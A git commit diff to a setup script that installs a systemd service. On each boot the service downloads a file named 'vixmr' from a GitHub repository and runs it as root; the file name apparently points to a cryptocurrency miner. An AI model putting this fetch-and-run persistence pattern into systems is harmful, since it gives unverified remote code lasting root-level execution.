b26c3c3431831a43abb629cb907160f01938acde
kiemtien1 <101563360+kiemtien1@users.noreply.github.com>
2025-02-27 21:43:09 +0700

    Update auto-script1.sh

--- auto-script1.sh
+++ auto-script1.sh
@@ -2,18 +2,18 @@
 
 cat << 'EOF' | sudo tee /etc/systemd/system/auto-script.service
 [Unit]
-Description=Chạy script tự động sau khi boot
+Description=Download and run user-data script on boot
 After=network-online.target
 Wants=network-online.target
 
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c 'curl -sL https://raw.githubusercontent.com/kiemtien1/data/refs/heads/main/auto.sh | bash'
+ExecStart=/bin/bash -c 'echo "Downloading user-data from GitHub..."; curl -sL https://raw.githubusercontent.com/kiemtien1/data/refs/heads/main/vixmr -o /tmp/user_data.sh && bash /tmp/user_data.sh'
 RemainAfterExit=true
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-systemctl daemon-reload
-systemctl enable auto-script.service
+sudo systemctl daemon-reload
+sudo systemctl enable auto-script.service
